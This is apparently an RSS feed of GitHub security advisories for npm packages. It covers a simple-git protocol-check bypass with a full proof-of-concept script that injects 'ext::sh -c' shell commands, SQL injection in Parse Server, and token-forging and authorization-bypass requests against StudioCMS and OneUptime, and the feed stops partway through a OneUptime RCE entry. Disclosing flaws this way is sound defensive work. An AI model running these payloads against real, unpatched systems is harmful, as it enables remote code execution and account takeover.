<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-03-10T20:05:12.182Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[simple-git] simple-git has blockUnsafeOperationsPlugin bypass via case-insensitive protocol.allow config key enables RCE]]></title>
        <id>https://github.com/advisories/GHSA-r275-fr43-pm7q</id>
        <link href="https://github.com/advisories/GHSA-r275-fr43-pm7q"/>
        <updated>2026-03-10T18:38:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>blockUnsafeOperationsPlugin</code> in <code>simple-git</code> fails to block git protocol
override arguments when the config key is passed in uppercase or mixed case.
An attacker who controls arguments passed to git operations can enable the
<code>ext::</code> protocol by passing <code>-c PROTOCOL.ALLOW=always</code>, which executes an
arbitrary OS command on the host machine.</p>
<hr>
<h3 id="details">Details</h3>
<p>The <code>preventProtocolOverride</code> function in
<code>simple-git/src/lib/plugins/block-unsafe-operations-plugin.ts</code> (line 24)
checks whether a <code>-c</code> argument configures <code>protocol.allow</code> using this regex:</p>
<pre><code class="language-ts">if (!/^\s*protocol(.[a-z]+)?.allow/.test(next)) {
   return;
}
</code></pre>
<p>This regex is case-sensitive. Git treats config key names
case-insensitively — it normalises them to lowercase internally.
As a result, passing <code>PROTOCOL.ALLOW=always</code>, <code>Protocol.Allow=always</code>,
or any mixed-case variant is not matched by the regex, the check
returns without throwing, and git is spawned with the unsafe argument.</p>
<p><strong>Verification that git normalises the key:</strong></p>
<pre><code class="language-bash">$ git -c PROTOCOL.ALLOW=always config --list | grep protocol
protocol.allow=always
</code></pre>
<p><strong>The fix is a single character — add the <code>/i</code> flag:</strong></p>
<pre><code class="language-ts">// Before (vulnerable):
if (!/^\s*protocol(.[a-z]+)?.allow/.test(next)) {

// After (fixed):
if (!/^\s*protocol(.[a-z]+)?.allow/i.test(next)) {
</code></pre>
<hr>
<h2 id="pocjs">poc.js</h2>
<pre><code class="language-js">/**
 * Proof of Concept — simple-git preventProtocolOverride Case-Sensitivity Bypass
 *
 * CVE-2022-25912 was fixed in simple-git@3.15.0 by adding a regex check
 * that blocks `-c protocol.*.allow=always` from being passed to git commands.
 * The regex is case-sensitive. Git treats config key names case-insensitively.
 * Passing `-c PROTOCOL.ALLOW=always` bypasses the check entirely.
 *
 * Affected : simple-git &gt;= 3.15.0 (all versions with the fix applied)
 * Tested on: simple-git@3.32.2, Node.js v23.11.0, git 2.39.5
 * Reporter : CodeAnt AI Security Research (securityreseach@codeant.ai)
 */

const simpleGit = require('simple-git');
const fs = require('fs');

const SENTINEL = '/tmp/pwn-codeant';

// Clean up from any previous run
try { fs.unlinkSync(SENTINEL); } catch (_) {}

const git = simpleGit();

// ── Original CVE-2022-25912 vector — BLOCKED by the 2022 fix ────────────────
// This is the exact PoC Snyk used to report CVE-2022-25912.
// It is correctly blocked by preventProtocolOverride in block-unsafe-operations-plugin.ts.
git.clone('ext::sh -c touch% /tmp/pwn-original% &gt;&amp;2', '/tmp/example-new-repo', [
  '-c', 'protocol.ext.allow=always',   // lowercase — caught by regex
]).catch((e) =&gt; {
  console.log('ext:: executed:poc', fs.existsSync(SENTINEL) ? 'PWNED — ' + SENTINEL + ' created' : 'not created');
  console.error(e);
});

// ── Bypass — PROTOCOL.ALLOW=always (uppercase) ──────────────────────────────
// The fix regex /^\s*protocol(.[a-z]+)?.allow/ is case-sensitive.
// Git normalises config key names to lowercase internally.
// Uppercase variant passes the check; git enables ext:: and executes the command.
git.clone('ext::sh -c touch% ' + SENTINEL + '% &gt;&amp;2', '/tmp/example-new-repo-2', [
  '-c', 'PROTOCOL.ALLOW=always',       // uppercase — NOT caught by regex
]).catch((e) =&gt; {
  console.log('ext:: executed:', fs.existsSync(SENTINEL) ? 'PWNED — ' + SENTINEL + ' created' : 'not created');
  console.error(e);
});

// ── Real-world scenario ──────────────────────────────────────────────────────
// An application cloning a legitimate repository with user-controlled customArgs.
// Attacker supplies PROTOCOL.ALLOW=always alongside a malicious ext:: URL.
// The application intends to clone https://github.com/CodeAnt-AI/codeant-quality-gates
// but the injected argument enables ext:: and the real URL executes the command instead.
//
// Legitimate usage (what the app expects):
//   simpleGit().clone('https://github.com/CodeAnt-AI/codeant-quality-gates',
//                     '/tmp/codeant-quality-gates', userArgs)
//
// Attacker-controlled scenario (what actually runs when args are not sanitised):
const LEGITIMATE_URL = 'https://github.com/CodeAnt-AI/codeant-quality-gates';
const CLONE_DEST     = '/tmp/codeant-quality-gates';
const SENTINEL_RW    = '/tmp/pwn-realworld';
try { fs.unlinkSync(SENTINEL_RW); } catch (_) {}

const userArgs   = ['-c', 'PROTOCOL.ALLOW=always'];
const attackerURL = 'ext::sh -c touch% ' + SENTINEL_RW + '% &gt;&amp;2';

simpleGit().clone(
  attackerURL,   // should have been LEGITIMATE_URL
  CLONE_DEST,
  userArgs
).catch(() =&gt; {
  console.log('real-world scenario [target: ' + LEGITIMATE_URL + ']:',
    fs.existsSync(SENTINEL_RW) ? 'PWNED — ' + SENTINEL_RW + ' created' : 'not created');
});
</code></pre>
<hr>
<h2 id="test-results">Test Results</h2>
<h3 id="vector-1--original-cve-2022-25912-protocolextallowalways-lowercase">Vector 1 — Original CVE-2022-25912 (<code>protocol.ext.allow=always</code>, lowercase)</h3>
<p><strong>Result: BLOCKED ✅</strong></p>
<p>The original Snyk PoC payload using lowercase <code>protocol.ext.allow=always</code> is correctly intercepted by <code>preventProtocolOverride</code> before git is invoked. A <code>GitPluginError</code> is thrown immediately and the sentinel file is never created.</p>
<p><strong>Output:</strong></p>
<pre><code>ext:: executed:poc not created
GitPluginError: Configuring protocol.allow is not permitted without enabling allowUnsafeExtProtocol
    at preventProtocolOverride (.../simple-git/dist/cjs/index.js:1228:9)
    at .../simple-git/dist/cjs/index.js:1266:40
    at Array.forEach (&lt;anonymous&gt;)
    at Object.action (.../simple-git/dist/cjs/index.js:1264:12)
    at PluginStore.exec (.../simple-git/dist/cjs/index.js:1489:29)
    at GitExecutorChain.attemptRemoteTask (.../simple-git/dist/cjs/index.js:1881:36)
    at GitExecutorChain.attemptTask (.../simple-git/dist/cjs/index.js:1865:88) {
  task: {
    commands: [
      'clone',
      '-c',
      'protocol.ext.allow=always',
      'ext::sh -c touch% /tmp/pwn-original% &gt;&amp;2',
      '/tmp/example-new-repo'
    ],
    format: 'utf-8',
    parser: [Function: parser]
  },
  plugin: 'unsafe'
}
</code></pre>
<hr>
<h3 id="vector-2--uppercase-bypass-protocolallowalways">Vector 2 — Uppercase bypass (<code>PROTOCOL.ALLOW=always</code>)</h3>
<p><strong>Result: BYPASSED ⚠️ — RCE confirmed</strong></p>
<p>The <code>preventProtocolOverride</code> regex <code>/^\s*protocol(.[a-z]+)?.allow/</code> is case-sensitive. <code>PROTOCOL.ALLOW=always</code> (uppercase) passes the check without error. Git normalises config key names to lowercase internally, enabling the <code>ext::</code> protocol. The injected shell command executes before git errors on the missing repository stream.</p>
<p><strong>Output:</strong></p>
<pre><code>ext:: executed: PWNED — /tmp/pwn-codeant created
GitError: Cloning into '/tmp/example-new-repo-2'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.

    at Object.action (.../simple-git/dist/cjs/index.js:1440:25)
    at PluginStore.exec (.../simple-git/dist/cjs/index.js:1489:29) {
  task: {
    commands: [
      'clone',
      '-c',
      'PROTOCOL.ALLOW=always',
      'ext::sh -c touch% /tmp/pwn-codeant% &gt;&amp;2',
      '/tmp/example-new-repo-2'
    ],
    format: 'utf-8',
    parser: [Function: parser]
  }
}
</code></pre>
<p><code>/tmp/pwn-codeant</code> was created by the git subprocess — command execution confirmed.</p>
<hr>
<h3 id="vector-3--real-world-scenario-target-httpsgithubcomcodeant-aicodeant-quality-gates">Vector 3 — Real-world scenario (target: <code>https://github.com/CodeAnt-AI/codeant-quality-gates</code>)</h3>
<p><strong>Result: BYPASSED ⚠️ — RCE confirmed</strong></p>
<p>An application passes user-controlled <code>customArgs</code> to <code>simpleGit().clone()</code>. The attacker injects <code>PROTOCOL.ALLOW=always</code> and substitutes a malicious <code>ext::</code> URL in place of the intended repository URL. The plugin does not block the uppercase variant; git enables <code>ext::</code> and executes the payload before the application can detect the failure.</p>
<p><strong>Output:</strong></p>
<pre><code>real-world scenario [target: https://github.com/CodeAnt-AI/codeant-quality-gates]: PWNED — /tmp/pwn-realworld created
</code></pre>
<p><code>/tmp/pwn-realworld</code> was created — arbitrary command execution in a realistic application context confirmed.</p>
<hr>
<h2 id="summary-1">Summary</h2>
<table>
<thead>
<tr>
<th>#</th>
<th>Vector</th>
<th>Payload</th>
<th>Sentinel file</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>CVE-2022-25912 original</td>
<td><code>protocol.ext.allow=always</code> (lowercase)</td>
<td>not created</td>
<td>Blocked ✅</td>
</tr>
<tr>
<td>2</td>
<td>Case-sensitivity bypass</td>
<td><code>PROTOCOL.ALLOW=always</code> (uppercase)</td>
<td><code>/tmp/pwn-codeant</code> created</td>
<td><strong>RCE ⚠️</strong></td>
</tr>
<tr>
<td>3</td>
<td>Real-world app scenario</td>
<td><code>PROTOCOL.ALLOW=always</code> + attacker URL</td>
<td><code>/tmp/pwn-realworld</code> created</td>
<td><strong>RCE ⚠️</strong></td>
</tr>
</tbody></table>
<p>The case-sensitive regex in <code>preventProtocolOverride</code> blocks <code>protocol.*.allow</code> but does not account for uppercase or mixed-case variants. Git accepts all variants identically due to case-insensitive config key normalisation, allowing full bypass of the protection in all versions of simple-git that carry the 2022 fix.</p>
<p><code>/tmp/pwned</code> is created by the git subprocess via the <code>ext::</code> protocol.</p>
<p>All of the following bypass the check:</p>
<table>
<thead>
<tr>
<th>Argument passed via <code>-c</code></th>
<th align="center">Regex matches?</th>
<th align="center">Git honours it?</th>
</tr>
</thead>
<tbody><tr>
<td><code>protocol.allow=always</code></td>
<td align="center">✅ blocked</td>
<td align="center">✅</td>
</tr>
<tr>
<td><code>PROTOCOL.ALLOW=always</code></td>
<td align="center">❌ bypassed</td>
<td align="center">✅</td>
</tr>
<tr>
<td><code>Protocol.Allow=always</code></td>
<td align="center">❌ bypassed</td>
<td align="center">✅</td>
</tr>
<tr>
<td><code>PROTOCOL.allow=always</code></td>
<td align="center">❌ bypassed</td>
<td align="center">✅</td>
</tr>
<tr>
<td><code>protocol.ALLOW=always</code></td>
<td align="center">❌ bypassed</td>
<td align="center">✅</td>
</tr>
</tbody></table>
<hr>
<h3 id="impact">Impact</h3>
<p>Any application that passes user-controlled values into the <code>customArgs</code>
parameter of <code>clone()</code>, <code>fetch()</code>, <code>pull()</code>, <code>push()</code> or similar <code>simple-git</code>
methods is vulnerable to arbitrary command execution on the host machine.</p>
<p>The <code>ext::</code> git protocol executes an arbitrary binary as a remote helper.
With <code>protocol.allow=always</code> enabled, an attacker can run any OS command
as the process user — full read, write and execution access on the host.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/steveukx/git-js/commit/f7042088aa2dac59e3c49a84d7a2f4b26048a257">https://github.com/steveukx/git-js/commit/f7042088aa2dac59e3c49a84d7a2f4b26048a257</a></li>
<li><a href="https://www.codeant.ai/security-research/security-research-simple-git-remote-code-execution-cve-2026-28292">https://www.codeant.ai/security-research/security-research-simple-git-remote-code-execution-cve-2026-28292</a></li>
<li><a href="https://github.com/advisories/GHSA-r275-fr43-pm7q">https://github.com/advisories/GHSA-r275-fr43-pm7q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r275-fr43-pm7q</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-10T18:38:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server: SQL injection via dot-notation field name in PostgreSQL]]></title>
        <id>https://github.com/advisories/GHSA-qpr4-jrj4-6f27</id>
        <link href="https://github.com/advisories/GHSA-qpr4-jrj4-6f27"/>
        <updated>2026-03-10T18:25:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker can use a dot-notation field name in combination with the <code>sort</code> query parameter to inject SQL into the PostgreSQL database through an improper escaping of sub-field values in dot-notation queries. The vulnerability may also affect queries that use dot-notation field names with the <code>distinct</code> and <code>where</code> query parameters.</p>
<p>This vulnerability only affects deployments using a PostgreSQL database.</p>
<h3 id="patches">Patches</h3>
<p>The fix escapes characters in dot-notation sub-field values that could allow a SQL breakout.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no known workaround.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27">https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27</a></li>
<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2</a></li>
<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.28">https://github.com/parse-community/parse-server/releases/tag/8.6.28</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27">https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/8.6.28">https://github.com/parse-community/parse-server/releases/tag/8.6.28</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2</a></li>
<li><a href="https://github.com/advisories/GHSA-qpr4-jrj4-6f27">https://github.com/advisories/GHSA-qpr4-jrj4-6f27</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qpr4-jrj4-6f27</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-10T18:25:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server: SQL injection via dot-notation field name in PostgreSQL]]></title>
        <id>https://github.com/advisories/GHSA-qpr4-jrj4-6f27</id>
        <link href="https://github.com/advisories/GHSA-qpr4-jrj4-6f27"/>
        <updated>2026-03-10T18:25:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker can use a dot-notation field name in combination with the <code>sort</code> query parameter to inject SQL into the PostgreSQL database through an improper escaping of sub-field values in dot-notation queries. The vulnerability may also affect queries that use dot-notation field names with the <code>distinct</code> and <code>where</code> query parameters.</p>
<p>This vulnerability only affects deployments using a PostgreSQL database.</p>
<h3 id="patches">Patches</h3>
<p>The fix escapes characters in dot-notation sub-field values that could allow a SQL breakout.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no known workaround.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27">https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27</a></li>
<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2</a></li>
<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.28">https://github.com/parse-community/parse-server/releases/tag/8.6.28</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27">https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/8.6.28">https://github.com/parse-community/parse-server/releases/tag/8.6.28</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2</a></li>
<li><a href="https://github.com/advisories/GHSA-qpr4-jrj4-6f27">https://github.com/advisories/GHSA-qpr4-jrj4-6f27</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qpr4-jrj4-6f27</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-10T18:25:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[studiocms] StudioCMS has Privilege Escalation via Insecure API Token Generation]]></title>
        <id>https://github.com/advisories/GHSA-667w-mmh7-mrr4</id>
        <link href="https://github.com/advisories/GHSA-667w-mmh7-mrr4"/>
        <updated>2026-03-10T18:45:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The /studiocms_api/dashboard/api-tokens endpoint allows any authenticated user (at least Editor) to generate API tokens for any other user, including owner and admin accounts. The endpoint fails to validate whether the requesting user is authorized to create tokens on behalf of the target user ID, resulting in a full privilege escalation.</p>
<h2 id="details">Details</h2>
<p>The API token generation endpoint accepts a user parameter in the request body that specifies which user the token should be created for. The server-side logic authenticates the session (via auth_session cookie) but does not verify that the authenticated user matches the target user ID nor checks if the caller has sufficient privileges to perform this action on behalf of another user.
This is a classic BOLA vulnerability: the authorization check is limited to "is the user logged in?" instead of "is this user authorized to perform this action on this specific resource?"</p>
<h4 id="vulnerable-code">Vulnerable Code</h4>
<p>The following is the server-side handler for the POST /studiocms_api/dashboard/api-tokens endpoint:
<strong>File:</strong> packages/studiocms/frontend/pages/studiocms_api/dashboard/api-tokens.ts (lines 16–57)
<strong>Version:</strong> <a href="mailto:studiocms@0.3.0">studiocms@0.3.0</a></p>
<pre><code>POST: (ctx) =&gt;
    genLogger('studiocms/routes/api/dashboard/api-tokens.POST')(function* () {
        const sdk = yield* SDKCore;

        // Check if demo mode is enabled
        if (developerConfig.demoMode !== false) {
            return apiResponseLogger(403, 'Demo mode is enabled, this action is not allowed.');
        }

        // Get user data
        const userData = ctx.locals.StudioCMS.security?.userSessionData;       // [1]

        // Check if user is logged in
        if (!userData?.isLoggedIn) {                                            // [2]
            return apiResponseLogger(403, 'Unauthorized');
        }

        // Check if user has permission
        const isAuthorized = ctx.locals.StudioCMS.security?.userPermissionLevel.isEditor;  // [3]
        if (!isAuthorized) {
            return apiResponseLogger(403, 'Unauthorized');
        }

        // Get Json Data
        const jsonData = yield* readAPIContextJson&lt;{
            description: string;
            user: string;                                                       // [4]
        }&gt;(ctx);

        // Validate form data
        if (!jsonData.description) {
            return apiResponseLogger(400, 'Invalid form data, description is required');
        }

        if (!jsonData.user) {
            return apiResponseLogger(400, 'Invalid form data, user is required');
        }

        // [5] jsonData.user passed directly — no check against userData
        const newToken = yield* sdk.REST_API.tokens.new(jsonData.user, jsonData.description);

        return createJsonResponse({ token: newToken.key });                     // [6]
    }),
</code></pre>
<p><strong>Analysis</strong>
The authorization logic has three distinct flaws:</p>
<ol>
<li><strong>Insufficient permission gate [1][2][3]:</strong> The handler retrieves the session from ctx.locals.StudioCMS.security and only verifies that isEditor is true. This means any user with editor privileges or above passes the gate. </li>
<li><strong>Missing object-level authorization [4][5]:</strong> The user field from the JSON payload (line 54) is passed directly to sdk.REST_API.tokens.new() without any comparison against userData (the authenticated caller's identity from the session at [1]). There is no check such as jsonData.user === userData.id. This allows any authenticated user to specify an arbitrary target UUID and generate a token for that account.</li>
<li><strong>No target role validation [5]:</strong> Even if cross-user token generation were an intended feature, there is no check to prevent a lower-privileged user from generating tokens for higher-privileged accounts (admin, owner).</li>
</ol>
<h2 id="poc">PoC</h2>
<p><strong>Environment</strong>
The following user roles were identified in the application:
<em>User ID | Role</em>
2450bf33-0135-4142-80be-9854f9a5e9f1 | owner
eacee42e-ae7e-4e9e-945b-68e26696ece4 | admin
2d93a386-e9cb-451e-a811-d8a34bfdf4da | admin
39b3e7d3-5eb0-48e1-abdc-ce95a57b212c | editor
a1585423-9ade-426e-a713-9c81ed035463 | visitor</p>
<p><strong>Step 1 — Generate an API Token for the Owner (as Editor)</strong>
An authenticated Editor sends the following request, specifying the owner user ID in the body:</p>
<pre><code>POST /studiocms_api/dashboard/api-tokens HTTP/1.1
Host: &lt;target&gt;
Cookie: auth_session=&lt;editor_session_cookie&gt;
Content-Type: application/json
Content-Length: 74

{
  "user": "2450bf33-0135-4142-80be-9854f9a5e9f1",
  "description": "pwn"
}
</code></pre>
<p><strong>Result:</strong> The server returns a valid JWT token bound to the owner account.</p>
<p><strong>Step 2 — Use the Token to Access the API as Owner</strong></p>
<pre><code>curl -H "Authorization: Bearer &lt;owner_jwt_token&gt;" http://&lt;target&gt;/studiocms_api/rest/v1/users
</code></pre>
<p><strong>Result:</strong> The attacker now has full API access with owner privileges, including the ability to list all users, modify content, and manage the application.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Privilege Escalation:</strong> Any authenticated user (above visitor) can escalate to owner level access.</li>
<li><strong>Full API Access:</strong> The generated token grants unrestricted access to all REST API endpoints with the impersonated user's permissions.</li>
<li><strong>Account Takeover:</strong> An attacker can impersonate any user in the system by specifying their UUID.</li>
<li><strong>Data Breach:</strong> Access to user listings, content management, and potentially sensitive configuration data.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/withstudiocms/studiocms/security/advisories/GHSA-667w-mmh7-mrr4">https://github.com/withstudiocms/studiocms/security/advisories/GHSA-667w-mmh7-mrr4</a></li>
<li><a href="https://github.com/withstudiocms/studiocms/commit/9eec9c3b45523b635cfe16d55aa55afabacbebe3">https://github.com/withstudiocms/studiocms/commit/9eec9c3b45523b635cfe16d55aa55afabacbebe3</a></li>
<li><a href="https://github.com/withstudiocms/studiocms/releases/tag/studiocms%400.4.0">https://github.com/withstudiocms/studiocms/releases/tag/studiocms%400.4.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30944">https://nvd.nist.gov/vuln/detail/CVE-2026-30944</a></li>
<li><a href="https://github.com/withstudiocms/studiocms/commit/f4a209fc090c90195e2419fff47b48a46eab7441">https://github.com/withstudiocms/studiocms/commit/f4a209fc090c90195e2419fff47b48a46eab7441</a></li>
<li><a href="https://github.com/withstudiocms/studiocms/releases/tag/studiocms@0.4.0">https://github.com/withstudiocms/studiocms/releases/tag/studiocms@0.4.0</a></li>
<li><a href="https://github.com/advisories/GHSA-667w-mmh7-mrr4">https://github.com/advisories/GHSA-667w-mmh7-mrr4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-667w-mmh7-mrr4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-10T18:16:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@oneuptime/common] OneUptime has WhatsApp Resend Verification Authorization Bypass]]></title>
        <id>https://github.com/advisories/GHSA-cw6x-mw64-q6pv</id>
        <link href="https://github.com/advisories/GHSA-cw6x-mw64-q6pv"/>
        <updated>2026-03-10T18:45:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>  The resend-verification-code endpoint allows any authenticated user to trigger a verification code resend for any <code>UserWhatsApp</code> record by ID. Ownership is not validated (unlike the verify endpoint).</p>
<h3 id="affected-source">Affected Source</h3>
<ul>
<li>Endpoint: <a href="https://github.com/OneUptime/oneuptime/Common/Server/API/UserWhatsAppAPI.ts#L129-L153">UserWhatsAppAPI.ts</a>  </li>
<li>Service: <a href="https://github.com/OneUptime/oneuptime/Common/Server/API/UserWhatsAppAPI.ts#L129-L153">UserWhatsAppService.ts</a>  </li>
<li>Verify ownership (present in verify endpoint for comparison): <a href="https://github.com/OneUptime/oneuptime/Common/Server/API/UserWhatsAppAPI.ts#L78-L87">UserWhatsAppAPI.ts</a></li>
</ul>
<h3 id="full-code-lines-userwhatsappapits">Full Code Lines (UserWhatsAppAPI.ts)</h3>
<p>Resend path (authorization gap):</p>
<pre><code class="language-ts">    this.router.post(
      `${new this.entityType()
        .getCrudApiPath()
        ?.toString()}/resend-verification-code`,
      UserMiddleware.getUserMiddleware,
      async (req: ExpressRequest, res: ExpressResponse, next: NextFunction) =&gt; {
        try {
          req = req as OneUptimeRequest;

          if (!req.body.itemId) {
            return Response.sendErrorResponse(
              req,
              res,
              new BadDataException("Invalid item ID"),
            );
          }

          await this.service.resendVerificationCode(req.body.itemId);

          return Response.sendEmptySuccessResponse(req, res);
        } catch (err) {
          return next(err);
        }
      },
    );
</code></pre>
<p>Verify path (ownership check present):</p>
<pre><code class="language-ts">          if (
            item.userId?.toString() !==
            (req as OneUptimeRequest)?.userAuthorization?.userId?.toString()
          ) {
            return Response.sendErrorResponse(
              req,
              res,
              new BadDataException("Invalid user ID"),
            );
          }
</code></pre>
<h2 id="prerequisites">Prerequisites</h2>
<ul>
<li>Valid attacker account with access to a project</li>
<li>Attacker access token</li>
<li>A victim’s <code>UserWhatsApp</code> itemId belonging to the same project</li>
</ul>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li><p>Set your attacker token:</p>
<pre><code class="language-bash">export ATK="Bearer &lt;attacker-access-token&gt;"
</code></pre>
</li>
<li><p>Trigger resend for the victim’s item:</p>
<pre><code class="language-bash">curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: $ATK" \
  -d '{"itemId":"&lt;victim-userwhatsapp-id&gt;"}' \
  http://&lt;host&gt;/api/user-whats-app/resend-verification-code
</code></pre>
</li>
</ol>
<h2 id="expectedobserved-behavior">Expected/Observed Behavior</h2>
<ul>
<li>HTTP 200 with <code>{}</code> body and a new verification code sent to the victim’s phone</li>
<li>No checks confirm that <code>item.userId</code> equals the authenticated user’s ID for the resend path</li>
</ul>
<h2 id="impact">Impact</h2>
<ul>
<li>Spam/DoS against victims’ phone numbers, social engineering pressure, and potential lockout flows due to repeated resends</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<ul>
<li>Enforce ownership: <code>item.userId</code> must match the authenticated user</li>
<li>Add per-item and per-user rate limiting for resends</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OneUptime/oneuptime/security/advisories/GHSA-cw6x-mw64-q6pv">https://github.com/OneUptime/oneuptime/security/advisories/GHSA-cw6x-mw64-q6pv</a></li>
<li><a href="https://github.com/OneUptime/oneuptime/releases/tag/10.0.21">https://github.com/OneUptime/oneuptime/releases/tag/10.0.21</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30959">https://nvd.nist.gov/vuln/detail/CVE-2026-30959</a></li>
<li><a href="https://github.com/advisories/GHSA-cw6x-mw64-q6pv">https://github.com/advisories/GHSA-cw6x-mw64-q6pv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cw6x-mw64-q6pv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-10T01:15:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@oneuptime/common] OneUptime has Synthetic Monitor RCE via exposed Playwright browser object]]></title>
        <id>https://github.com/advisories/GHSA-jw8q-gjvg-8w4q</id>
        <link href="https://github.com/advisories/GHSA-jw8q-gjvg-8w4q"/>
        <updated>2026-03-10T18:45:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>OneUptime Synthetic Monitors allow a low-privileged authenticated project user to execute arbitrary commands on the <code>oneuptime-probe</code> server/container.</p>
<p>The root cause is that untrusted Synthetic Monitor code is executed inside Node's <code>vm</code> while live host-realm Playwright <code>browser</code> and <code>page</code> objects are exposed to it. A malicious user can call Playwright APIs on the injected <code>browser</code> object and cause the probe to spawn an attacker-controlled executable.</p>
<p>This is a server-side remote code execution issue. It does not require a separate <code>vm</code> sandbox escape.</p>
<h2 id="details">Details</h2>
<p>A normal project member can create or edit monitors and monitor tests:</p>
<ul>
<li><code>Monitor</code> access control: <a href="https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Models/DatabaseModels/Monitor.ts#L45-L70">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Models/DatabaseModels/Monitor.ts#L45-L70</a></li>
<li><code>MonitorTest</code> access control: <a href="https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Models/DatabaseModels/MonitorTest.ts#L27-L52">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Models/DatabaseModels/MonitorTest.ts#L27-L52</a></li>
</ul>
<p>The dashboard exposes a Playwright code editor for Synthetic Monitors and allows a user to queue a test run:</p>
<ul>
